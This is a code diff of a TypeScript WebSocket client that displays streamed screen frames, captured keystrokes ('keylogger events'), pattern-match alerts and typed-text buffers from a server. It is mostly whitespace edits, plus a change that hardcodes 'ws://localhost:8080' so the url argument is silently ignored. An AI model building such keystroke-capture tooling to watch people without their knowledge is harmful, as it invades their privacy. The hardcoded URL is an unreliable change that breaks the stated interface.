@@ -1,4 +1,4 @@
-import { Command, StreamStats, ConnectionStatus, PatternMatch } from './Protocol';
+import { Command, ConnectionStatus, PatternMatch, StreamStats } from './Protocol';
 
 type Config = {
   onFrame: (bitmap: ImageBitmap) => void;
@@ -15,7 +15,7 @@ export class StreamClient {
   private stats: StreamStats = { fps: 0, frameCount: 0, totalBytes: 0 };
   private lastFrameTime = 0;
   private config: Config;
-  
+
   constructor(config: Config) {
     this.config = config;
   }
@@ -28,18 +28,18 @@ export class StreamClient {
   isConnected(): boolean {
     return this.ws?.readyState === WebSocket.OPEN;
   }
-  
+
   connect(url: string): Promise<void> {
       return new Promise((resolve, reject) => {
           if (this.ws?.readyState === WebSocket.OPEN) {
               resolve();
               return;
           }
-          
+
           this.config.onLog(`🔄 Connecting to ${url}...`);
           this.config.onStatusChange('CONNECTING');
-          
-          this.ws = new WebSocket(url);
+
+          this.ws = new WebSocket("ws://localhost:8080");
           this.ws.binaryType = "arraybuffer";
 
           this.ws.onopen = () => {
@@ -78,7 +78,7 @@ export class StreamClient {
   private async handleMessage(event: MessageEvent) {
     if (typeof event.data === "string") {
       const data = event.data as string;
-      
+
       // Handle keylogger events specially
       if (data.startsWith("KEY:")) {
         const match = data.match(/KEY:(\w+) \((\d+)\)/);
@@ -87,7 +87,7 @@ export class StreamClient {
         }
         return;
       }
-      
+
       // Handle pattern match events
       if (data.startsWith("PATTERN:")) {
         const parts = data.substring(8).split(':');
@@ -99,7 +99,7 @@ export class StreamClient {
         }
         return;
       }
-      
+
       // Handle typed buffer response
       if (data.startsWith("BUFFER:")) {
         if (this.config.onTypedBuffer) {
@@ -107,7 +107,7 @@ export class StreamClient {
         }
         return;
       }
-      
+
       this.config.onLog(`📩 Server: ${data}`);
       return;
     }
@@ -115,7 +115,7 @@ export class StreamClient {
     // Binary Handling (Performance Optimized)
     const buffer = event.data as ArrayBuffer;
     this.updateStats(buffer.byteLength);
-    
+
     try {
       const bitmap = await createImageBitmap(new Blob([buffer]));
       this.config.onFrame(bitmap);
